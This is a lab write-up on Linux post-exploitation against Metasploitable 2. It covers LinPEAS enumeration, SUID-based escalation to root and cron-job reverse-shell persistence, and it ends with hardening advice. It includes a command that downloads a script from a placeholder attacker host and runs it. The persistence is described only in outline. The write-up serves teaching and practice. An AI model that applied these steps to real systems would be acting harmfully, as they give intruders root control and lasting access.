## Privilege Escalation and Persistence
# Overview

This lab focuses on post-exploitation techniques, specifically local privilege escalation and persistence mechanisms on a compromised Linux system.
After gaining initial access, enumeration was performed using LinPEAS, leading to identification of misconfigurations and successful escalation to root-level access.

# Objectives

Enumerate the system for privilege escalation vectors

Identify SUID binaries and misconfigurations

Escalate privileges to root

Establish persistence using system-level mechanisms

Document findings and outcomes

# Lab Environment
| Component      | Details                |
| -------------- | ---------------------- |
| Attacker       | Kali Linux             |
| Target         | Metasploitable 2       |
| Target IP      | `192.168.56.101`       |
| Initial Access | Meterpreter (www-data) |
| Tools          | Meterpreter, LinPEAS   |

# Initial Access Context

Initial access to the target system was achieved through a successful exploitation phase, resulting in a Meterpreter session running as a low-privileged user.

getuid 

Server username: www-data

Privilege Escalation Methodology
# 1️.System Enumeration with LinPEAS

LinPEAS was uploaded to the target system and executed to identify privilege escalation vectors.

# Commands Used

wget http://<attacker-ip>:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh


# Key Enumeration Areas

SUID binaries

Kernel version and known exploits

Writable system files

Cron jobs and services

# 2️.UID-Based Privilege Escalation

LinPEAS identified dangerous SUID binaries that could be abused to escalate privileges.

Finding:

Misconfigured SUID binaries allowed command execution with elevated privileges

Result:

Successful escalation to root shell

whoami:

root

# Privilege Escalation Log (Required)
| Task ID | Technique    | Target IP      | Status  | Outcome    |
| ------- | ------------ | -------------- | ------- | ---------- |
| 010     | SUID Exploit | 192.168.56.101 | Success | Root Shell |

# Persistence Mechanism
Cron Job Persistence

To maintain persistent access after reboot, a cron job was created to execute a reverse shell script periodically.

Persistence Concept

Abuse writable cron configuration

Execute attacker-controlled payload at scheduled intervals

Impact:

Persistent access without re-exploitation

Survives system reboot

# Impact Analysis

Complete system compromise

Root-level control over the host

Ability to modify system configuration

Long-term persistence capability

# Core concepts:

Remove unnecessary SUID binaries

Enforce least privilege principles

Regularly audit cron jobs and services

Patch outdated kernels and packages

Monitor system integrity and file permissions
